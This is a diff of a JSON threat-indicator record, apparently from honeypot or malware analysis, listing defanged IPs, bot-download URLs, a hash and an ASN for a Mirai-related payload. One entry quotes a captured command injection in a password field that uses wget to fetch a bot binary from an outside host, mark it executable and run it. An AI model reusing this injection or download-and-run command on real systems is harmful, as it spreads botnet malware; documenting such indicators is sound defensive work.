@@ -1,21 +1,9 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "184.174.96.XXX"
-  },
-  {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "190.179.172.XXX"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://184.174.96.XXX:8114/bot.armv4;"
+    "value": "hxxp://184.174.96.XXX:8114/bot.x86_64;"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -27,7 +15,13 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://184.174.96.XXX:8114/bot.armv6;"
+    "value": "hxxp://184.174.96.XXX:8114/bot.mipsel;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://184.174.96.XXX:8114/bot.mips;"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -45,31 +39,37 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://184.174.96.XXX:8114/bot.mips;"
+    "value": "hxxp://184.174.96.XXX:8114/bot.armv4;"
   },
   {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://184.174.96.XXX:8114/bot.mipsel;"
+    "value": "hxxp://184.174.96.XXX:8114/bot.armv6;"
   },
   {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://184.174.96.XXX:8114/bot.x86_64;"
-  },
-  {
-    "context": "Inbound payload hash (mirai)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b"
+    "type": "ip",
+    "value": "184.174.96.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.172.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "{\"password\":\"$(wget -q -O /tmp/bot_x86_64 hxxp://184.174.96.XXX:8114/bot.x86_64; chmod +x /tmp/bot_x86_64; /tmp/bot_x86_"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "35fb45ac455a57a16327bf870a83a00d3c43dff515be5aef8bc81bdf122c4a0b"
   },
   {
     "asn": "Pfcloud UG (haftungsbeschrankt)",
